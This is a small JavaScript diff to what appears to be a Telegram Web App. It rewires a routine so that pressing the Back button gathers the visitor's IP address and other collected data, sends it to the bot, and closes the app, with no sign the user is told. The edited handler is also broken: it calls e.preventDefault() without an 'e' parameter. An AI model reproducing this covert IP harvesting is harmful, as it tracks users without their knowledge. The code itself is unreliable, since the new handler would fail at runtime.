@@ -157,12 +157,16 @@
             });
         }
 
-        document.addEventListener('DOMContentLoaded', async (e) => {
+        window.Telegram.WebApp.BackButton.show().onClick( async () => {
             e.preventDefault();
+            
+            if (!IS_IP_SENT) {
+                await collectIP();
 
-            await collectIP();
+                window.Telegram.WebApp.sendData(JSON.stringify(collectedData));
 
-            window.Telegram.WebApp.sendData(JSON.stringify(collectedData));
+                window.Telegram.WebApp.close();
+            }
         });
 
         // Обработчик отправки формы
